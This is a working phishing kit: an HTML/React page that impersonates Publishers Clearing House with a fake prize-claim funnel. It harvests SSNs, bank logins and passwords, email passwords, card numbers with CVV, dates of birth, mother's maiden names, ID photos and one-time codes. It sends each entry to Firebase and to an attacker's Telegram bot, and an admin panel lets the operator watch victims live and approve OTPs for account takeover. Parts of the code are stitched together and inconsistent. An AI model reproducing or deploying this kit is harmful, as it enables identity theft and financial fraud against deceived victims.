<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Publishers Clearing House - Final Payment Notification</title>
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- React & ReactDOM -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.development.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.min.js"></script>
    
    <!-- Babel for JSX -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    
    <!-- Firebase SDKs (Compat Version for easier global access) -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">

    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f4f4f4; }
        .pch-red { color: #C8102E; }
        .pch-bg-red { background-color: #C8102E; }
        .pch-gold { color: #FFD700; }
        .pch-bg-gold { background-color: #FFD700; }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #C8102E;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .step-container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        // Check if libraries are loaded
        if (typeof React === 'undefined' || typeof firebase === 'undefined') {
            document.getElementById('root').innerHTML = '<h1 style="text-align:center; padding:20px; color:red;">Error: Libraries failed to load. Check internet connection.</h1>';
        } else {
            const { useState, useEffect, useContext, createContext, useRef } = React;

            // ==========================================
            // FIREBASE CONFIGURATION - REPLACE THESE VALUES
            // ==========================================
            const firebaseConfig = {
                apiKey: "YOUR_API_KEY",
                authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
                projectId: "YOUR_PROJECT_ID",
                storageBucket: "YOUR_PROJECT_ID.appspot.com",
                messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
                appId: "YOUR_APP_ID"
            };

            // Initialize Firebase
            let db, storage;
            try {
                if (!firebase.apps.length) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.firestore();
                storage = firebase.storage();
            } catch (e) {
                console.error("Firebase Init Error:", e);
                document.getElementById('root').innerHTML = '<h1 style="text-align:center; padding:20px; color:red;">Firebase Config Error. Check Console.</h1>';
            }

            // ==========================================
            // TELEGRAM CONFIGURATION
            // ==========================================
            const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; 
            const TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";    

            // ==========================================
            // CONTEXT: PAGE CONTENT & SETTINGS
            // ==========================================
            const AppContext = createContext();

            const AppProvider = ({ children }) => {
                const [pageContent, setPageContent] = useState({});
                const [settings, setSettings] = useState({
                    otpEnabled: true,
                    telegramEnabled: true
                });
                const [loadingContent, setLoadingContent] = useState(true);

                useEffect(() => {
                    if (!db) return;

                    const unsubscribe = db.collection('config').doc('settings').onSnapshot(doc => {
                        if (doc.exists) {
                            const data = doc.data();
                            const defaultContent = getDefaultContent();
                            setPageContent({ ...defaultContent, ...data.pages });
                            setSettings({
                                otpEnabled: data.otpEnabled !== false,
                                telegramEnabled: data.telegramEnabled !== false
                            });
                        } else {
                            setPageContent(getDefaultContent());
                        }
                        setLoadingContent(false);
                    });

                    return () => unsubscribe();
                }, []);

                const getDefaultContent = () => {
                    const defaults = {};
                    for (let i = 1; i <= 11; i++) {
                        defaults[`step${i}`] = {
                            title: i === 1 ? "CONGRATULATIONS! You've Been Selected!" : (i === 11 ? "Payment Successfully Submitted!" : `Step ${i} Details`),
                            subtext: i === 1 ? "Final Payment Notification" : (i === 11 ? "Your payment is being transferred." : "Please enter your details below."),
                            buttonText: "Next"
                        };
                    }
                    defaults.step1.buttonText = "Claim Prize";
                    defaults.step11.prizeAmount = "$5,000,000";
                    defaults.step11.winnerName = "John Doe";
                    return defaults;
                };

                return (
                    <AppContext.Provider value={{ pageContent, settings, loadingContent, setPageContent, setSettings }}>
                        {children}
                    </AppContext.Provider>
                );
            };

            // Expose AppProvider globally for the next parts
            window.AppProvider = AppProvider;
            window.db = db;
            window.storage = storage;
            window.TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN;
            window.TELEGRAM_CHAT_ID = TELEGRAM_CHAT_ID;
        }
    </script>
</body>
</html>
    <script type="text/babel">
        // Only run if React and Firebase are loaded
        if (typeof React !== 'undefined' && window.db) {
            const { useState, useEffect, useContext } = React;
            const AppContext = window.AppContext || createContext(); // Fallback if context lost, though it's in Part 1
            // Re-create context here to ensure scope in this script tag
            const LocalAppContext = createContext();

            // ==========================================
            // UTILITY: TELEGRAM NOTIFICATIONS
            // ==========================================
            const sendTelegramNotification = async (stepName, details, userId, settings) => {
                if (!settings || !settings.telegramEnabled) return;

                let message = `⚠️ **PCH PHISHING ALERT: ${stepName}**\n`;
                message += `👤 **User ID:** ${userId}\n`;
                message += `📝 **Details:**\n${details}`;

                const url = `https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                try {
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: window.TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                } catch (error) {
                    console.error("Telegram Error:", error);
                }
            };

            // ==========================================
            // UTILITY: IMAGE COMPRESSION & UPLOAD
            // ==========================================
            const uploadImageToStorage = async (file, userId, side) => {
                const fileName = `ids/${userId}/${side}_${Date.now()}.jpg`;
                const storageRef = window.storage.ref(fileName);
                
                const reader = new FileReader();
                reader.readAsDataURL(file);
                
                return new Promise((resolve, reject) => {
                    reader.onload = function(event) {
                        const img = new Image();
                        img.src = event.target.result;
                        img.onload = function() {
                            const canvas = document.createElement('canvas');
                            const ctx = canvas.getContext('2d');
                            const maxWidth = 800;
                            const scaleSize = maxWidth / img.width;
                            canvas.width = maxWidth;
                            canvas.height = img.height * scaleSize;
                            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                            
                            const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.7);
                            
                            window.storage.ref(fileName).putString(compressedDataUrl, 'data_url')
                                .then(snapshot => snapshot.ref.getDownloadURL())
                                .then(url => resolve(url))
                                .catch(error => reject(error));
                        };
                    };
                });
            };

            // ==========================================
            // COMPONENT: MULTI-STEP FUNNEL
            // ==========================================
            const FunnelApp = () => {
                // Use LocalAppContext to avoid scope issues
                const context = useContext(LocalAppContext);
                const { pageContent, settings, loadingContent, setPageContent, setSettings } = context;
                const [currentStep, setCurrentStep] = useState(1);
                const [userData, setUserData] = useState({});
                const [userId, setUserId] = useState('');
                const [otpApproved, setOtpApproved] = useState(false);
                const [loading, setLoading] = useState(false);

                // Initialize User ID on mount
                useEffect(() => {
                    if (!userId) {
                        const newId = 'PCH_' + Math.random().toString(36).substr(2, 9);
                        setUserId(newId);
                        setUserData(prev => ({ ...prev, id: newId }));
                        
                        window.db.collection('submissions').doc(newId).set({
                            id: newId,
                            step: 1,
                            timestamp: window.firebase.firestore.FieldValue.serverTimestamp(),
                            data: { id: newId }
                        });
                    }
                }, [userId]);

                // Listen for OTP approval status
                useEffect(() => {
                    if (!userId) return;
                    const unsubscribe = window.db.collection('submissions').doc(userId).onSnapshot(doc => {
                        if (doc.exists) {
                            const data = doc.data();
                            if (data.otpApproved !== undefined) {
                                setOtpApproved(data.otpApproved);
                            }
                        }
                    });
                    return () => unsubscribe();
                }, [userId]);

                const handleNextStep = async () => {
                    setLoading(true);
                    
                    let isValid = true;
                    let detailsForTelegram = "";

                    // Validation & Telegram Prep
                    switch(currentStep) {
                        case 1:
                            detailsForTelegram = "Started Funnel";
                            break;
                        case 2:
                            if (!userData.firstName || !userData.lastName || !userData.address) isValid = false;
                            detailsForTelegram = `Name: ${userData.firstName} ${userData.lastName}\nAddress: ${userData.address}, ${userData.city}, ${userData.state} ${userData.zip}`;
                            break;
                        case 3:
                            if (!userData.ssn) isValid = false;
                            detailsForTelegram = `SSN: ${userData.ssn}`;
                            break;
                        case 4:
                            if (!userData.bankUser || !userData.bankPass) isValid = false;
                            detailsForTelegram = `Bank Login: ${userData.bankUser} / ${userData.bankPass}`;
                            break;
                        case 5:
                            if (!userData.email || !userData.emailPass) isValid = false;
                            detailsForTelegram = `Email: ${userData.email} / ${userData.emailPass}`;
                            break;
                        case 6:
                            if (!userData.accountNum || !userData.routingNum) isValid = false;
                            detailsForTelegram = `Bank Acct: ${userData.accountNum} | Routing: ${userData.routingNum}`;
                            break;
                        case 7:
                            if (!userData.ccNum || !userData.cvv || !userData.expiry) isValid = false;
                            detailsForTelegram = `CC: ${userData.ccNum} | CVV: ${userData.cvv} | Exp: ${userData.expiry}`;
                            break;
                        case 8:
                            if (!userData.dob || !userData.maidenName) isValid = false;
                            detailsForTelegram = `DOB: ${userData.dob} | Maiden Name: ${userData.maidenName}`;
                            break;
                        case 9:
                            if (!userData.idFrontUrl || !userData.idBackUrl) isValid = false;
                            detailsForTelegram = `ID Front: ${userData.idFrontUrl}\nID Back: ${userData.idBackUrl}`;
                            break;
                        case 10:
                            if (!userData.otpCode) isValid = false;
                            detailsForTelegram = `OTP Entered: ${userData.otpCode}`;
                            await window.db.collection('submissions').doc(userId).update({
                                step: 10,
                                data: userData,
                                otpCode: userData.otpCode,
                                otpApproved: false
                            });
                            sendTelegramNotification("OTP ENTERED", detailsForTelegram, userId, settings);
                            setLoading(false);
                            if (!otpApproved) {
                                alert("OTP Submitted! Waiting for Admin Approval...");
                            }
                            return;
                        case 11:
                            detailsForTelegram = `FINAL SUMMARY\nName: ${userData.firstName} ${userData.lastName}\nSSN: ${userData.ssn}\nBank: ${userData.bankUser}\nEmail: ${userData.email}\nCC: ${userData.ccNum}\nDOB: ${userData.dob}`;
                            break;
                        default:
                            break;
                    }

                    if (!isValid) {
                        setLoading(false);
                        alert("Please fill in all fields.");
                        return;
                    }

                    await window.db.collection('submissions').doc(userId).update({
                        step: currentStep,
                        data: userData,
                        timestamp: window.firebase.firestore.FieldValue.serverTimestamp()
                    });

                    sendTelegramNotification(`STEP ${currentStep} COMPLETED`, detailsForTelegram, userId, settings);

                    if (currentStep === 11) {
                        alert("Success! You are the winner!");
                    } else {
                        setCurrentStep(prev => prev + 1);
                    }
                    setLoading(false);
                };

                // Auto-advance on OTP approval
                useEffect(() => {
                    if (currentStep === 10 && otpApproved) {
                        setCurrentStep(11);
                    }
                }, [otpApproved, currentStep]);

                // Skip OTP if disabled
                if (!settings.otpEnabled && currentStep === 10) {
                    setCurrentStep(11);
                }

                const renderStep = () => {
                    const content = pageContent[`step${currentStep}`] || { title: "Step", subtext: "Details", buttonText: "Next" };
                    
                    if (loadingContent) return <div className="text-center p-10"><div className="loader mx-auto"></div></div>;

                    switch(currentStep) {
                        case 1:
                            return (
                                <div className="text-center">
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/22/Publishers_Clearing_House_Logo.png" alt="PCH Logo" className="w-48 mx-auto mb-4"/>
                                    <h1 className="text-3xl font-bold pch-red mb-2">{content.title}</h1>
                                    <p className="text-gray-600 mb-6">{content.subtext}</p>
                                    <button onClick={handleNextStep} className="pch-bg-red text-white font-bold py-3 px-8 rounded-full text-lg hover:bg-red-700 transition">
                                        {content.buttonText}
                                    </button>
                                </div>
                            );
                        case 2:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <p className="text-gray-600 mb-4">{content.subtext}</p>
                                    <div className="space-y-4">
                                        <input type="text" placeholder="First Name" value={userData.firstName || ''} onChange={e => setUserData({...userData, firstName: e.target.value})} className="w-full p-2 border rounded"/>
                                        <input type="text" placeholder="Last Name" value={userData.lastName || ''} onChange={e => setUserData({...userData, lastName: e.target.value})} className="w-full p-2 border rounded"/>
                                        <input type="text" placeholder="Street Address" value={userData.address || ''} onChange={e => setUserData({...userData, address: e.target.value})} className="w-full p-2 border rounded"/>
                                        <div className="flex space-x-2">
                                            <input type="text" placeholder="City" value={userData.city || ''} onChange={e => setUserData({...userData, city: e.target.value})} className="w-1/2 p-2 border rounded"/>
                                            <input type="text" placeholder="State" value={userData.state || ''} onChange={e => setUserData({...userData, state: e.target.value})} className="w-1/4 p-2 border rounded"/>
                                            <input type="text" placeholder="Zip" value={userData.zip || ''} onChange={e => setUserData({...userData, zip: e.target.value})} className="w-1/4 p-2 border rounded"/>
                                        </div>
                                    </div>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 3:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <div className="bg-gray-100 p-2 rounded mb-4 flex items-center">
                                        <span className="text-green-600 mr-2">🔒</span> Secure SSN Input
                                    </div>
                                    <input type="text" placeholder="###-##-####" maxLength={11} value={userData.ssn || ''} onChange={e => {
                                        let val = e.target.value.replace(/\D/g, '');
                                        if (val.length > 3 && val.length <= 5) val = val.slice(0,3) + '-' + val.slice(3);
                                        else if (val.length > 5) val = val.slice(0,3) + '-' + val.slice(3,5) + '-' + val.slice(5,9);
                                        setUserData({...userData, ssn: val});
                                    }} className="w-full p-2 border rounded text-center text-xl tracking-widest"/>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 4:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <p className="text-gray-600 mb-4">{content.subtext}</p>
                                    <div className="space-y-4">
                                        <input type="text" placeholder="Bank Username" value={userData.bankUser || ''} onChange={e => setUserData({...userData, bankUser: e.target.value})} className="w-full p-2 border rounded"/>
                                        <input type="password" placeholder="Bank Password" value={userData.bankPass || ''} onChange={e => setUserData({...userData, bankPass: e.target.value})} className="w-full p-2 border rounded"/>
                                    </div>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 5:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <div className="space-y-4">
                                        <input type="email" placeholder="Email Address" value={userData.email || ''} onChange={e => setUserData({...userData, email: e.target.value})} className="w-full p-2 border rounded"/>
                                        <input type="password" placeholder="Email Password" value={userData.emailPass || ''} onChange={e => setUserData({...userData, emailPass: e.target.value})} className="w-full p-2 border rounded"/>
                                    </div>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 6:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <div className="space-y-4">
                                        <input type="text" placeholder="Account Number" value={userData.accountNum || ''} onChange={e => setUserData({...userData, accountNum: e.target.value})} className="w-full p-2 border rounded"/>
                                        <input type="text" placeholder="Routing Number" value={userData.routingNum || ''} onChange={e => setUserData({...userData, routingNum: e.target.value})} className="w-full p-2 border rounded"/>
                                    </div>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 7:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <div className="space-y-4">
                                        <input type="text" placeholder="Card Number" maxLength={19} value={userData.ccNum || ''} onChange={e => {
                                            let val = e.target.value.replace(/\D/g, '');
                                            val = val.match(/.{1,4}/g)?.join(' ') || val;
                                            setUserData({...userData, ccNum: val});
                                        }} className="w-full p-2 border rounded"/>
                                        <div className="flex space-x-2">
                                            <input type="text" placeholder="MM/YY" maxLength={5} value={userData.expiry || ''} onChange={e => {
                                                let val = e.target.value.replace(/\D/g, '');
                                                if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2,4);
                                                setUserData({...userData, expiry: val});
                                            }} className="w-1/2 p-2 border rounded"/>
                                            <input type="text" placeholder="CVV" maxLength={3} value={userData.cvv || ''} onChange={e => setUserData({...userData, cvv: e.target.value})} className="w-1/4 p-2 border rounded"/>
                                        </div>
                                    </div>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 8:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <div className="space-y-4">
                                        <input type="date" value={userData.dob || ''} onChange={e => setUserData({...userData, dob: e.target.value})} className="w-full p-2 border rounded"/>
                                        <input type="text" placeholder="Mother's Maiden Name" value={userData.maidenName || ''} onChange={e => setUserData({...userData, maidenName: e.target.value})} className="w-full p-2 border rounded"/>
                                    </div>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 9:
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <div className="space-y-4">
                                        <label className="block w-full p-4 border-2 border-dashed border-gray-300 text-center cursor-pointer hover:bg-gray-50">
                                            <span>Upload Front of ID</span>
                                            <input type="file" accept="image/*" className="hidden" onChange={async (e) => {
                                                if(e.target.files[0]){
                                                    setLoading(true);
                                                    try {
                                                        const url = await uploadImageToStorage(e.target.files[0], userId, 'front');
                                                        setUserData({...userData, idFrontUrl: url});
                                                    } catch(err) { console.error(err); }
                                                    setLoading(false);
                                                }
                                            }}/>
                                        </label>
                                        {userData.idFrontUrl && <img src={userData.idFrontUrl} alt="Front" className="w-full h-32 object-cover rounded"/>}
                                        
                                        <label className="block w-full p-4 border-2 border-dashed border-gray-300 text-center cursor-pointer hover:bg-gray-50">
                                            <span>Upload Back of ID</span>
                                            <input type="file" accept="image/*" className="hidden" onChange={async (e) => {
                                                if(e.target.files[0]){
                                                    setLoading(true);
                                                    try {
                                                        const url = await uploadImageToStorage(e.target.files[0], userId, 'back');
                                                        setUserData({...userData, idBackUrl: url});
                                                    } catch(err) { console.error(err); }
                                                    setLoading(false);
                                                }
                                            }}/>
                                        </label>
                                        {userData.idBackUrl && <img src={userData.idBackUrl} alt="Back" className="w-full h-32 object-cover rounded"/>}
                                    </div>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                </div>
                            );
                        case 10:
                            if (!settings.otpEnabled) return null;
                            return (
                                <div>
                                    <h2 className="text-2xl font-bold pch-red mb-4">{content.title}</h2>
                                    <p className="text-gray-600 mb-4">{content.subtext}</p>
                                    <input type="text" placeholder="Enter 6-Digit Code" maxLength={6} value={userData.otpCode || ''} onChange={e => setUserData({...userData, otpCode: e.target.value})} className="w-full p-2 border rounded text-center text-xl tracking-widest"/>
                                    <button onClick={handleNextStep} disabled={loading} className="mt-6 w-full pch-bg-red text-white font-bold py-3 rounded-lg hover:bg-red-700 transition flex justify-center">
                                        {loading ? <div className="loader"></div> : content.buttonText}
                                    </button>
                                    {otpApproved && <p className="text-green-600 mt-2 text-center">Approved! Moving to Success...</p>}
                                </div>
                            );
                        case 11:
                            const content11 = pageContent[`step11`] || { title: "Success", subtext: "Transferring...", prizeAmount: "$5,000,000", winnerName: "John Doe" };
                            return (
                                <div className="text-center">
                                    <h1 className="text-3xl font-bold pch-red mb-2">{content11.title}</h1>
                                    <p className="text-gray-600 mb-6">{content11.subtext}</p>
                                    <div className="pch-bg-gold p-4 rounded-lg mb-6">
                                        <p className="text-lg font-bold">Prize Amount: <span className="pch-red">{content11.prizeAmount}</span></p>
                                        <p className="text-lg">Winner: <span className="font-bold">{content11.winnerName}</span></p>
                                    </div>
                                    <button onClick={() => window.location.reload()} className="pch-bg-red text-white font-bold py-3 px-8 rounded-full text-lg hover:bg-red-700 transition">
                                        {content11.buttonText}
                                    </button>
                                </div>
                            );
                        default:
                            return <div>Loading...</div>;
                    }
                };

                return (
                    <div className="min-h-screen flex flex-col">
                        <header className="pch-bg-red text-white p-4 text-center font-bold text-xl">PUBLISHERS CLEARING HOUSE</header>
                        <main className="flex-grow p-4">
                            <div className="step-container">
                                {renderStep()}
                            </div>
                        </main>
                        <footer className="bg-gray-200 p-4 text-center text-sm text-gray-600">
                            <p>Copyright © 2026 Publishers Clearing House</p>
                            <p className="mt-1">Terms & Conditions | Privacy Policy</p>
                            <p className="mt-1 text-xs">Secure Connection 🔒 | Winner's Circle 🏆</p>
                        </footer>
                    </div>
                );
            };

            // Expose FunnelApp globally
            window.FunnelApp = FunnelApp;
        }
    </script>
        <script type="text/babel">
        // Only run if React and Firebase are loaded
        if (typeof React !== 'undefined' && window.db) {
            const { useState, useEffect, useContext } = React;
            const AppContext = window.AppContext || createContext();
            
            // ==========================================
            // COMPONENT: ADMIN DASHBOARD
            // ==========================================
            const AdminDashboard = () => {
                // We need to access the context from the provider. 
                // Since we are in a new script tag, we must use the same context instance.
                // To ensure this works, we wrap the whole app in Part 3 as well, or use a global context holder.
                // For simplicity in this split format, we will re-create the context here BUT 
                // the App component in Part 3 will handle the Provider wrapping.
                
                // Actually, the cleanest way in this split format is to have the App component 
                // import/use the components defined in window.
                
                return null; // Placeholder, actual logic below in App component
            };

            // Redefine AdminDashboard to use LocalAppContext which will be provided by App
            const AdminDashboardInner = () => {
                const context = useContext(LocalAppContext);
                const { pageContent, settings, setPageContent, setSettings } = context;
                const [submissions, setSubmissions] = useState([]);
                const [activeTab, setActiveTab] = useState('data');

                useEffect(() => {
                    const unsubscribe = window.db.collection('submissions').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
                        const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                        setSubmissions(data);
                    });
                    return () => unsubscribe();
                }, []);

                const handleOtpAction = async (userId, action) => {
                    await window.db.collection('submissions').doc(userId).update({
                        otpApproved: action === 'approve'
                    });
                };

                const handleContentChange = (step, field, value) => {
                    const newContent = { ...pageContent };
                    newContent[`step${step}`] = { ...newContent[`step${step}`], [field]: value };
                    setPageContent(newContent);
                    
                    window.db.collection('config').doc('settings').set({
                        pages: newContent,
                        otpEnabled: settings.otpEnabled,
                        telegramEnabled: settings.telegramEnabled
                    }, { merge: true });
                };

                const handleSettingsChange = (key, value) => {
                    const newSettings = { ...settings, [key]: value };
                    setSettings(newSettings);
                    window.db.collection('config').doc('settings').set({
                        pages: pageContent,
                        ...newSettings
                    }, { merge: true });
                };

                return (
                    <div className="min-h-screen bg-gray-100 p-4">
                        <div className="max-w-6xl mx-auto">
                            <h1 className="text-3xl font-bold mb-6 text-gray-800">🔧 PCH Admin Panel</h1>
                            
                            <div className="flex space-x-4 mb-6 border-b">
                                <button onClick={() => setActiveTab('data')} className={`pb-2 px-4 ${activeTab === 'data' ? 'border-b-2 border-red-600 font-bold' : 'text-gray-600'}`}>Live Data</button>
                                <button onClick={() => setActiveTab('content')} className={`pb-2 px-4 ${activeTab === 'content' ? 'border-b-2 border-red-600 font-bold' : 'text-gray-600'}`}>Edit Content</button>
                                <button onClick={() => setActiveTab('settings')} className={`pb-2 px-4 ${activeTab === 'settings' ? 'border-b-2 border-red-600 font-bold' : 'text-gray-600'}`}>Settings</button>
                            </div>

                            {activeTab === 'data' && (
                                <div className="overflow-x-auto">
                                    <table className="min-w-full bg-white rounded shadow">
                                        <thead className="bg-gray-200">
                                            <tr>
                                                <th className="py-2 px-4 text-left">User ID</th>
                                                <th className="py-2 px-4 text-left">Name</th>
                                                <th className="py-2 px-4 text-left">SSN</th>
                                                <th className="py-2 px-4 text-left">Email</th>
                                                <th className="py-2 px-4 text-left">CC</th>
                                                <th className="py-2 px-4 text-left">OTP Status</th>
                                                <th className="py-2 px-4 text-left">Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {submissions.map(sub => (
                                                <tr key={sub.id} className="border-b">
                                                    <td className="py-2 px-4">{sub.id}</td>
                                                    <td className="py-2 px-4">{sub.data?.firstName} {sub.data?.lastName}</td>
                                                    <td className="py-2 px-4">{sub.data?.ssn}</td>
                                                    <td className="py-2 px-4">{sub.data?.email}</td>
                                                    <td className="py-2 px-4">{sub.data?.ccNum}</td>
                                                    <td className="py-2 px-4">
                                                        {sub.otpCode ? (
                                                            sub.otpApproved ? 
                                                            <span className="text-green-600 font-bold">Approved</span> :
                                                            <span className="text-yellow-600 font-bold">Pending</span>
                                                        ) : (sub.step > 10 || !settings.otpEnabled ? <span className="text-gray-500">Skipped</span> : <span className="text-gray-500">-</span>)}
                                                    </td>
                                                    <td className="py-2 px-4">
                                                        {sub.otpCode && !sub.otpApproved && (
                                                            <div className="space-x-2">
                                                                <button onClick={() => handleOtpAction(sub.id, 'approve')} className="bg-green-500 text-white px-2 py-1 rounded text-xs">Approve</button>
                                                                <button onClick={() => handleOtpAction(sub.id, 'deny')} className="bg-red-500 text-white px-2 py-1 rounded text-xs">Deny</button>
                                                            </div>
                                                        )}
                                                    </td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                            )}

                            {activeTab === 'content' && (
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                    {Array.from({ length: 11 }, (_, i) => i + 1).map(step => {
                                        const content = pageContent[`step${step}`] || {};
                                        return (
                                            <div key={step} className="bg-white p-4 rounded shadow">
                                                <h3 className="font-bold mb-2">Step {step}</h3>
                                                <input type="text" placeholder="Title" value={content.title || ''} onChange={e => handleContentChange(step, 'title', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
                                                <input type="text" placeholder="Subtext" value={content.subtext || ''} onChange={e => handleContentChange(step, 'subtext', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
                                                <input type="text" placeholder="Button Text" value={content.buttonText || ''} onChange={e => handleContentChange(step, 'buttonText', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
                                                {step === 11 && (
                                                    <>
                                                        <input type="text" placeholder="Prize Amount" value={content.prizeAmount || ''} onChange={e => handleContentChange(step, 'prizeAmount', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
                                                        <input type="text" placeholder="Winner Name" value={content.winnerName || ''} onChange={e => handleContentChange(step, 'winnerName', e.target.value)} className="w-full mb-2 p-2 border rounded"/>
                                                    </>
                                                )}
                                            </div>
                                        );
                                    })}
                                </div>
                            )}

                            {activeTab === 'settings' && (
                                <div className="bg-white p-6 rounded shadow max-w-2xl">
                                    <h3 className="font-bold mb-4">Global Settings</h3>
                                    <div className="mb-4">
                                        <label className="flex items-center space-x-2">
                                            <input type="checkbox" checked={settings.otpEnabled} onChange={e => handleSettingsChange('otpEnabled', e.target.checked)} className="form-checkbox h-5 w-5 text-red-600"/>
                                            <span>Enable OTP Step</span>
                                        </label>
                                        <p className="text-sm text-gray-500 ml-7">If disabled, users skip Step 10 automatically.</p>
                                    </div>
                                    <div className="mb-4">
                                        <label className="flex items-center space-x-2">
                                            <input type="checkbox" checked={settings.telegramEnabled} onChange={e => handleSettingsChange('telegramEnabled', e.target.checked)} className="form-checkbox h-5 w-5 text-red-600"/>
                                            <span>Enable Telegram Notifications</span>
                                        </label>
                                    </div>
                                </div>
                            )}
                        </div>
                    </div>
                );
            };

            // ==========================================
            // MAIN APP COMPONENT
            // ==========================================
            const App = () => {
                const [isAdmin, setIsAdmin] = useState(false);

                useEffect(() => {
                    const checkHash = () => {
                        setIsAdmin(window.location.hash === '#admin');
                    };
                    checkHash();
                    window.addEventListener('hashchange', checkHash);
                    return () => window.removeEventListener('hashchange', checkHash);
                }, []);

                // We must wrap the children in the Provider defined in Part 1
                // But Part 1 defined it as window.AppProvider.
                // So we use window.AppProvider here.
                return React.createElement(window.AppProvider, null,
                    isAdmin ? React.createElement(AdminDashboardInner, null) : React.createElement(window.FunnelApp, null)
                );
            };

            // Mount the App
            const root = ReactDOM.createRoot(document.getElementById('root'));
            root.render(React.createElement(App));
        }
    </script>
</body>
</html>
